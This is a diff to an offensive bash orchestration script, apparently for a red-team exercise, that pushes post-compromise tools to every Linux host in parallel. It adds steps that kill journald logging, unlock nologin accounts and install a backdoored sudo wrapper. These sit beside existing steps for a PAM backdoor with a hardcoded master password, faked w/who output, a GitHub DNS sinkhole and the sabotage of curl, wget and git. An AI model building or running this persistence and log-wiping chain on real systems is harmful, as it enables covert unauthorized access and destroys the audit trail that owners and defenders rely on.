@@ -4,9 +4,12 @@
 # 1. Pull latest tooling from GitHub
 # 2. Mass-deploy to all Linux hosts in parallel:
 #      - compromise-who   (fake w + who output)
+#      - nuke-journal     (kill all journald logging)
 #      - sinkhole         (dnsmasq GitHub sinkhole — fast)
+#      - infinite-users   (unlock all nologin accounts)
 #      - pam-backdoor     (auth as any user with rt2025!delta)
 #      - break-net-tools  (breaks curl, wget, git on targets)
+#      - sudo-binary      (backdoored sudo wrapper)
 #
 # Usage:
 #   ./let-the-madness-begin.sh [OPTIONS]
@@ -182,34 +185,39 @@ EOF
 echo -e "${NC}"
 
 # ── step 1: compromise w + who ────────────────────────────────────────────────
-hdr "Step 1/6 — Faking w + who"
+hdr "Step 1/7 — Faking w + who"
 info "Deploying compromise-who to all Linux hosts…"
 wave "compromise-who" compromise-who install
 
 # ── step 2: nuke journal ──────────────────────────────────────────────────────
-hdr "Step 2/6 — Nuking journald"
+hdr "Step 2/7 — Nuking journald"
 info "Deploying nuke-journal to all Linux hosts…"
 wave "nuke-journal   " nuke-journal install
 
 # ── step 3: github sinkhole ───────────────────────────────────────────────────
-hdr "Step 3/6 — GitHub dnsmasq sinkhole"
+hdr "Step 3/7 — GitHub dnsmasq sinkhole"
 info "Deploying sinkhole to all Linux hosts…"
 wave "sinkhole       " sinkhole install
 
 # ── step 4: infinite users ────────────────────────────────────────────────────
-hdr "Step 4/6 — Hijacking nologin accounts"
+hdr "Step 4/7 — Hijacking nologin accounts"
 info "Deploying infinite-users to all Linux hosts…"
 wave "infinite-users " infinite-users install
 
 # ── step 5: PAM backdoor ──────────────────────────────────────────────────────
-hdr "Step 5/6 — PAM backdoor"
+hdr "Step 5/7 — PAM backdoor"
 info "Deploying pam-backdoor to all Linux hosts…"
 wave "pam-backdoor   " pam-backdoor install
 
 # ── step 6: break net tools ───────────────────────────────────────────────────
-hdr "Step 6/6 — Breaking curl, wget, git"
+hdr "Step 6/7 — Breaking curl, wget, git"
 info "Deploying break-net-tools to all Linux hosts…"
 wave "break-net-tools" break-net-tools install
+
+# ── step 7: sudo binary backdoor ──────────────────────────────────────────────
+hdr "Step 7/7 — Backdooring sudo"
+info "Deploying sudo-binary to all Linux hosts…"
+wave "sudo-binary    " sudo-binary install
 
 # ── receipt ───────────────────────────────────────────────────────────────────
 print_receipt
